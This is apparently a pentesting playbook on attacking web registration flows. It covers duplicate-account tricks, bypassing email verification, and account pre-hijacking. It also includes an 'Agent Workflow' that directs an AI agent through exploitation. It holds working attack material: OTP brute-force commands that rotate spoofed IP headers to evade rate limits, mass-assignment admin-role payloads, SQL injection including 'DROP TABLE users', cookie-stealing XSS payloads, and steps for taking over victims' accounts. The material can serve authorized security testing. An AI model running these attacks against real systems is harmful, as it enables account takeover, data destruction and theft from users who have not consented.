# Registration Vulnerabilities

> **Summary**: Registration flows are a rich attack surface where flaws in input validation, uniqueness enforcement, verification logic, and parameter handling allow attackers to hijack accounts, escalate privileges, enumerate users, or bypass security controls.
> **Impact**: Account takeover, privilege escalation, user impersonation, data theft, denial of service against legitimate users, bypassing email/phone verification.
> **Typical Severity**: Medium | High | Critical (varies by specific flaw)

## Detection

### Indicators
- Registration forms that accept email, username, phone number, and password
- Different error messages for existing vs non-existing accounts ("Email already registered" vs generic error)
- Email/phone verification flows with numeric OTPs or magic links
- Registration endpoints that accept extra JSON fields beyond the visible form
- Lack of rate limiting on registration or verification endpoints
- No CAPTCHA or weak CAPTCHA on registration forms

### Automated Detection

#### Username/Email Enumeration via ffuf
```bash
ffuf -u https://<TARGET>/api/register \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"FUZZ@<TARGET_DOMAIN>","password":"Test@12345"}' \
  -w /opt/SecLists/Usernames/Names/names.txt \
  -mr "already registered|already exists|account exists" \
  -o enumerated-users.json
```

#### Arjun -- Hidden Registration Parameters
```bash
arjun -u https://<TARGET>/api/register -m POST -o reg-params.json
```

#### Param Miner (Burp Suite)
```
Right-click registration request -> Extensions -> Param Miner -> Guess body params
```

### Manual Detection
1. Attempt registration with an existing email/username and observe the error message
2. Check if error messages differ for existing vs non-existing accounts (timing, wording, HTTP status)
3. Inspect the registration request body for hidden/extra fields in the HTML source or JavaScript
4. Test the verification flow: check OTP length, token format, and expiration behavior
5. Attempt registration with special characters, Unicode, and whitespace in email/username fields

## Exploitation

### Prerequisites
- Access to the target's registration endpoint
- Optionally: a valid account for comparison testing
- Proxy tool (Burp Suite) for request interception and manipulation

### 1. Duplicate Registration Attacks

#### Case Variation
Register with an existing email using different casing. If the application does not normalize case, you may create a duplicate account or take over the original.
```
# Original account
admin@target.com

# Attack attempts
Admin@target.com
ADMIN@target.com
aDmIn@target.com
admin@Target.com
admin@TARGET.COM
```
- **Success criteria**: registration succeeds, and you can log in as the original user or access their data

#### Unicode Normalization
Use Unicode homoglyphs or confusable characters to create visually identical but technically different usernames/emails.
```
# Original
admin

# Unicode attacks (homoglyphs)
\u0430dmin      (Cyrillic 'a')
adm\u0131n      (dotless 'i')
\u00C0dmin      (A with grave accent -- may normalize to 'admin')
admi\u00F1      (n with tilde)
\u1D2Cdmin      (modifier letter capital A)
ad\u00ADmin     (soft hyphen -- invisible, may be stripped)
```

#### Whitespace Manipulation
```
# Leading/trailing spaces
" admin"
"admin "
" admin "

# Special whitespace characters
"admin\t"       (tab)
"admin\u200B"   (zero-width space)
"admin\u00A0"   (non-breaking space)
"admin\u3000"   (ideographic space)
```
- **Success criteria**: registration succeeds with a "different" username that the system later normalizes, granting access to the original account's data

#### Email Provider Canonicalization

**Gmail-specific tricks** (Gmail ignores dots and supports subaddressing):
```
# All deliver to victim@gmail.com
v.i.c.t.i.m@gmail.com
victim+anything@gmail.com
victim+tag123@gmail.com
v.ic.ti.m+test@gmail.com
```

**Plus addressing** (supported by many providers):
```
user+tag@example.com      -> delivers to user@example.com
user+registration@example.com
user+attacker@example.com
```

**Dot variations** (Gmail):
```
user.name@gmail.com       -> username@gmail.com
u.s.e.r.n.a.m.e@gmail.com
```
- **Success criteria**: create a duplicate account with a canonically equivalent email, then use it to access the victim's resources or bypass uniqueness checks

### 2. Email Verification Bypass

#### Response Manipulation
Intercept the verification response and change the status:
```http
# Original response
HTTP/1.1 200 OK
{"status": "error", "message": "Invalid code"}

# Manipulated response
HTTP/1.1 200 OK
{"status": "success", "message": "Email verified"}
```
- **Success criteria**: application client-side logic accepts the manipulated response and proceeds as verified

#### OTP Brute Force
```bash
# 4-digit OTP brute force
ffuf -u https://<TARGET>/api/verify-email \
  -X POST \
  -H "Content-Type: application/json" \
  -d '{"email":"attacker@email.com","code":"FUZZ"}' \
  -w <(seq -w 0000 9999) \
  -mc 200 \
  -fr "invalid|expired|wrong"

# 6-digit OTP brute force (with rate limit bypass via IP rotation)
ffuf -u https://<TARGET>/api/verify-email \
  -X POST \
  -H "Content-Type: application/json" \
  -H "X-Forwarded-For: FUZZ2" \
  -d '{"email":"attacker@email.com","code":"FUZZ"}' \
  -w <(seq -w 000000 999999):FUZZ \
  -w <(for i in $(seq 1 999999); do echo "10.$((RANDOM%255)).$((RANDOM%255)).$((RANDOM%255))"; done):FUZZ2 \
  -mc 200 \
  -fr "invalid|expired"
```

#### Multi-Value OTP Smuggling
Some backends accept multiple codes and verify if any matches:
```json
// Array of codes
{"email": "victim@email.com", "code": ["000000", "123456", "999999"]}

// Duplicate parameters
{"email": "victim@email.com", "code": "000000", "code": "123456"}

// Comma/pipe separated
{"email": "victim@email.com", "code": "000000,123456,999999"}
{"email": "victim@email.com", "code": "000000|123456|999999"}

// Alternative parameter names
{"email": "victim@email.com", "otp": "000000", "code": "123456", "verification_code": "999999"}
```

#### Race Condition -- Verification Token Reuse
```bash
# Send the same valid OTP simultaneously in two sessions
# One session becomes the verified attacker account
turbo-intruder or Burp Repeater "Send group in parallel"
```
See [Race Conditions](../vulns/race-conditions.md) for detailed race condition techniques.

#### Predictable Verification Tokens
Check if tokens are based on:
- Timestamp (try generating tokens at known times)
- User ID or email hash (MD5/SHA1 of the email)
- Sequential numbers
- Short random strings with low entropy
```bash
# Test for predictable tokens -- generate candidates based on timestamp
python3 -c "
import hashlib, time
email = 'victim@target.com'
for ts in range(int(time.time())-3600, int(time.time())+1):
    token = hashlib.md5(f'{email}{ts}'.encode()).hexdigest()
    print(token)
" > token-candidates.txt
```

#### Reusing Verification Links
1. Register an account and receive a verification link
2. Change the email address associated with the account (without re-verifying)
3. Use the original verification link -- if it still works, the new email is now verified without ownership proof

### 3. Registration Parameter Manipulation (Mass Assignment)

Inject privileged fields during registration to get elevated access from the start.

#### Role Injection
```http
POST /api/register HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"email": "attacker@email.com", "password": "Test@12345", "role": "admin"}
```

#### Common Privileged Parameters to Test
```json
{"role": "admin"}
{"isAdmin": true}
{"is_admin": true}
{"is_staff": true}
{"user_type": "administrator"}
{"verified": true}
{"email_verified": true}
{"account_type": "premium"}
{"permissions": ["admin"]}
{"organization_id": "<TARGET_ORG_ID>"}
{"invite_code": "bypass"}
{"referral_code": "internal"}
```
See [Mass Assignment](../vulns/mass-assignment.md) for comprehensive mass assignment techniques.

#### Modify User ID During Registration
```json
{"email": "attacker@email.com", "password": "Test@12345", "id": 1}
{"email": "attacker@email.com", "password": "Test@12345", "user_id": "<ADMIN_ID>"}
```
- **Success criteria**: account is created with admin privileges or linked to an existing admin user ID

#### Invitation Flow Injection
```http
# Intercept invitation acceptance and modify the role
POST /api/accept-invite HTTP/1.1
Content-Type: application/json

{"token": "<INVITE_TOKEN>", "password": "Test@12345", "role": "admin"}
```

### 4. Username Enumeration via Registration

#### Error Message Differences
```
# Existing user
POST /register -> "This email is already registered"

# Non-existing user
POST /register -> "Registration successful, please verify your email"
```

#### Timing-Based Enumeration
```bash
# Measure response time differences
for email in admin test user root; do
  start=$(date +%s%N)
  curl -s -o /dev/null -X POST https://<TARGET>/api/register \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"${email}@<TARGET_DOMAIN>\",\"password\":\"Test@12345\"}"
  end=$(date +%s%N)
  echo "${email}: $(( (end - start) / 1000000 ))ms"
done
```
- **Success criteria**: existing users trigger slower responses due to database lookups or IdP checks

#### HTTP Status Code Differences
```
# Existing: 409 Conflict or 422 Unprocessable Entity
# New user: 201 Created or 200 OK
```

### 5. Account Pre-Hijacking

Attack the victim's email/account before they sign up, then regain access later.

#### Classic-Federated Merge
1. Register a classic (email/password) account using the victim's email
2. Victim later signs up via SSO (Google, GitHub) with the same email
3. Insecure merge may leave the attacker's password-based access intact
- **Success criteria**: attacker can still log in with the password after the victim registers via SSO

#### Unexpired Session Persistence
1. Create account with victim's email and hold a long-lived session (do not log out)
2. Victim recovers/resets the password and uses the account
3. Test if old sessions remain valid after password reset or MFA enablement
- **Success criteria**: attacker's original session still works after victim's password reset

#### Trojan Identifier
1. Create account with victim's email
2. Add a secondary identifier (attacker's phone number, attacker's secondary email, or link attacker's IdP)
3. Victim resets password and uses the account normally
4. Attacker uses the trojan identifier to reset password or log in
- **Success criteria**: attacker recovers access via the secondary identifier

#### Unexpired Email Change
1. Create account with victim's email
2. Initiate email change to attacker's email but do NOT confirm it
3. Victim recovers and uses the account
4. Attacker later completes the pending email change
- **Success criteria**: attacker's email replaces the victim's, granting full account control

### 6. Registration-as-Reset (Upsert Vulnerability)

Some signup endpoints perform an upsert -- if the email exists, they overwrite the password.
```http
POST /api/register HTTP/1.1
Host: <TARGET>
Content-Type: application/json

{"email": "victim@target.com", "password": "AttackerPassword123!"}
```
- **Success criteria**: the victim's password is replaced, and the attacker can log in with the new password without any verification

### 7. SQL Injection in Registration Fields

Test registration fields for SQL injection:
```
# Email field
attacker@email.com' OR '1'='1
attacker@email.com'; DROP TABLE users;--

# Username field
admin'--
' UNION SELECT null,null,null--
```
See [SQLi](../vulns/sqli.md) for comprehensive SQL injection techniques.

### 8. XSS via Registration Fields

Inject XSS payloads in stored fields during registration:
```
# Username
<script>alert(document.cookie)</script>
"><img src=x onerror=alert(1)>

# Display name / Profile fields
<svg/onload=alert('XSS')>
javascript:alert(1)
```
If the username or profile name is rendered elsewhere (admin panel, user lists, comments), this becomes stored XSS. See [XSS](../vulns/xss.md).

### 9. Phone Number Registration Bypass

```
# Different formats for the same number
+1234567890
1234567890
+1 234-567-890
+1 (234) 567-890
001234567890

# Null byte injection
+1234567890%00
+1234567890\x00extra

# International prefix manipulation
+441234567890   (UK)
00441234567890
441234567890
```

### 10. Weak Password Policy Testing

Test minimum password requirements:
```
a               (single character)
123             (short numeric)
password        (common password)
12345678        (meets length, no complexity)
aaaaaa          (repeated characters)
<USERNAME>      (same as username)
<EMAIL_PREFIX>  (derived from email)
```
- **Success criteria**: weak passwords are accepted, enabling brute-force attacks

### Proof of Concept

#### Automated Duplicate Registration Test
```python
import requests

target = "https://<TARGET>/api/register"
victim_email = "admin@target.com"

variants = [
    victim_email.upper(),
    victim_email.replace("a", "\u0430", 1),  # Cyrillic 'a'
    f" {victim_email}",
    f"{victim_email} ",
    victim_email.replace("@", "+test@"),
    victim_email.replace("admin", "a.d.m.i.n"),
]

for variant in variants:
    r = requests.post(target, json={
        "email": variant,
        "password": "Test@12345!"
    })
    print(f"[{r.status_code}] {variant}: {r.text[:100]}")
```

## Bypasses

- **Rate limit bypass on OTP**: rotate `X-Forwarded-For`, `X-Real-IP`, `X-Originating-IP` headers per request
- **CAPTCHA bypass**: use CAPTCHA solving services, test if CAPTCHA token is reusable, or if removing the CAPTCHA parameter still works
- **Email blocklist bypass**: use subaddressing (`+tag`), unicode confusables, or different email providers
- **Disposable email detection bypass**: use `victim+mailinator@gmail.com` which delivers to victim's Gmail but looks like a disposable address
- **Phone verification bypass**: use VoIP numbers, virtual phone services, or SMS interception services
- **Token expiration bypass**: test if expired tokens still work, or if tokens are only checked client-side
- **WAF bypass for SQLi/XSS**: use encoding, case variation, or comment-based obfuscation in registration fields
- **IP-based rate limiting**: distribute requests across multiple IPs or use residential proxies
- **Account lockout bypass**: create a new account and retry instead of retrying on the same account

## Escalation

- Chain with [Mass Assignment](../vulns/mass-assignment.md): inject privileged parameters during registration for immediate admin access
- Chain with [Race Conditions](../vulns/race-conditions.md): exploit TOCTOU flaws in verification to verify attacker-controlled accounts
- Chain with [2FA Bypass](2fa.md): after account creation, test 2FA enrollment bypass or weak 2FA implementations
- Chain with account pre-hijacking: combine registration attacks with SSO/federated login for persistent access
- **Username enumeration -> credential stuffing**: use enumerated valid emails with leaked password databases
- **Stored XSS via registration**: inject XSS in username/profile fields to attack admin panels
- **Privilege escalation pipeline**: register with `role=admin` -> access admin endpoints -> exfiltrate data

## Tools

| Tool | Usage |
|------|-------|
| Burp Suite Repeater | Manual testing of registration parameter manipulation |
| [ffuf](https://github.com/ffuf/ffuf) | OTP brute force, username enumeration, parameter fuzzing |
| [Arjun](https://github.com/s0md3v/Arjun) | Discover hidden registration parameters |
| [Param Miner](https://portswigger.net/bappstore/17d2949a985c4b7ca092728dba871943) | Burp extension for hidden parameter discovery |
| Burp Turbo Intruder | High-speed OTP brute force with race conditions |
| [SQLMap](https://github.com/sqlmapproject/sqlmap) | Test registration fields for SQL injection |
| [Nuclei](https://github.com/projectdiscovery/nuclei) | Template-based scanning for registration vulnerabilities |
| Browser DevTools | Inspect registration form hidden fields and JS validation |

## Agent Workflow
> Step-by-step instructions for an AI agent to test for registration vulnerabilities.

### Phase 1: Discovery
1. Locate the registration endpoint on `<TARGET>`: `POST /register`, `POST /api/auth/signup`, etc.
2. Test registration with duplicate emails using case variations:
   ```
   <VICTIM_EMAIL>           (original)
   <VICTIM_EMAIL_UPPER>     (ADMIN@TARGET.COM)
   <VICTIM_EMAIL_MIXED>     (Admin@Target.com)
   ```
3. Test registration with Unicode confusables:
   ```
   Replace 'a' with Cyrillic 'a' (\u0430)
   Replace 'i' with dotless 'i' (\u0131)
   Add zero-width space (\u200B) or soft hyphen (\u00AD)
   ```
4. Test email provider canonicalization (Gmail dots, plus addressing):
   ```
   v.i.c.t.i.m@gmail.com
   victim+anything@gmail.com
   ```
5. Discover hidden registration parameters using Arjun or Param Miner:
   ```bash
   arjun -u https://<TARGET>/api/register -m POST -o reg-params.json
   ```
6. Check for user enumeration via registration: note different responses for existing vs. new emails

### Phase 2: Validation
1. **Email verification bypass -- response manipulation**: Register, intercept the verification response, change `"error"` to `"success"`, check if client-side accepts it
2. **OTP brute-force feasibility**: Determine OTP length and check for rate limiting on the verification endpoint:
   - 4-digit: 10,000 combinations (feasible if no rate limit)
   - 6-digit: 1,000,000 combinations (needs rate limit bypass)
3. **Mass assignment test**: Add privileged fields to the registration request body:
   ```json
   {"email": "<ATTACKER_EMAIL>", "password": "<PASSWORD>", "role": "admin"}
   {"email": "<ATTACKER_EMAIL>", "password": "<PASSWORD>", "isAdmin": true}
   {"email": "<ATTACKER_EMAIL>", "password": "<PASSWORD>", "verified": true}
   ```
4. **Predictable verification tokens**: Request verification tokens and check if they are based on timestamps, email hashes, or sequential IDs
5. **Race condition on verification**: Send the same valid OTP simultaneously in two sessions to check for token reuse

### Phase 3: Exploitation
1. **Duplicate registration**: Register with a case variant, Unicode confusable, or canonically equivalent email of the victim:
   - If accepted: try logging in and check if you access the victim's data
2. **Email verification bypass**: Use response manipulation, OTP brute-force, or multi-value OTP smuggling:
   ```json
   {"email": "<EMAIL>", "code": ["000000", "123456", "999999"]}
   ```
3. **Mass assignment privilege escalation**: Register with `"role": "admin"` or `"isAdmin": true` in the request body:
   ```http
   POST /api/register HTTP/1.1
   Content-Type: application/json
   {"email": "<ATTACKER_EMAIL>", "password": "<PASSWORD>", "role": "admin"}
   ```
   Check if the newly created account has admin privileges
4. **Account pre-hijacking**: Register with victim's email (classic-federated merge), add a trojan identifier, or initiate a pending email change -- wait for victim to sign up via OAuth
5. **Registration-as-Reset (upsert)**: If the signup endpoint overwrites existing accounts:
   ```http
   POST /api/register
   {"email": "<VICTIM_EMAIL>", "password": "<ATTACKER_PASSWORD>"}
   ```

### Phase 4: Escalation
1. Chain with account takeover: use duplicate registration or pre-hijacking to access victim's account
2. Chain with stored XSS: inject XSS payloads in username/display name fields during registration -- triggers when rendered in admin panels or user lists
3. Chain with SQLi: test registration fields for SQL injection to dump the database
4. If admin account created via mass assignment: access admin endpoints, enumerate users, exfiltrate data
5. Username enumeration pipeline: feed enumerated valid emails into credential stuffing attacks

## Decision Tree

```
Registration Testing
├── Duplicate registration
│   ├── Case variation (Admin@) → accepted? → log in as original user?
│   ├── Unicode confusable (Cyrillic a) → accepted? → log in as original user?
│   ├── Whitespace (leading/trailing) → accepted? → normalized to original?
│   └── Plus/dot addressing → accepted? → creates separate or merged account?
├── Email verification bypass
│   ├── Response manipulation (change error→success) → client accepts?
│   ├── OTP brute-force (4-6 digits) → rate limited?
│   │   └── No rate limit → brute-force feasible
│   ├── Multi-value OTP smuggling (array, comma, pipe) → any value accepted?
│   ├── Race condition → token reuse?
│   └── Predictable tokens (timestamp, hash) → predict valid token?
├── Mass assignment
│   ├── role=admin → admin account created?
│   ├── isAdmin=true → elevated privileges?
│   ├── verified=true → bypass email verification?
│   └── organization_id=<TARGET_ORG> → join target organization?
├── Account pre-hijacking
│   ├── Classic-federated merge → password access after victim SSO signup?
│   ├── Trojan identifier → recover access via secondary email/phone?
│   └── Unexpired email change → complete pending change after victim uses account?
├── Registration-as-Reset (upsert)
│   └── Register with existing email → password overwritten?
└── Injection in fields
    ├── SQLi in email/username → database access?
    └── XSS in username/display name → stored XSS in admin panel?
```

## Success Criteria
- [ ] Registered as an existing user via duplicate email technique (case, Unicode, canonicalization)
- [ ] Created an account with admin privileges via mass assignment (`role=admin`)
- [ ] Bypassed email verification without receiving/entering a valid code
- [ ] Pre-hijacked an account that the victim later authenticates via OAuth
- [ ] Overwrote an existing account's password via registration upsert vulnerability

## References
- [HackTricks - Registration & Takeover Vulnerabilities](https://book.hacktricks.wiki/en/pentesting-web/registration-vulnerabilities.html)
- [Microsoft MSRC - Pre-hijacking Attacks on Web User Accounts (2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [OWASP - Testing for Account Registration](https://owasp.org/www-project-web-security-testing-guide/latest/4-Web_Application_Security_Testing/03-Identity_Management_Testing/02-Test_User_Registration_Process)
- [PortSwigger - Authentication Vulnerabilities](https://portswigger.net/web-security/authentication)
- [SalmonSec - Account Takeover Cheatsheet](https://salmonsec.com/cheatsheet/account_takeover)
- [CVE-2020-7245 - CTFd Username Collision](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)
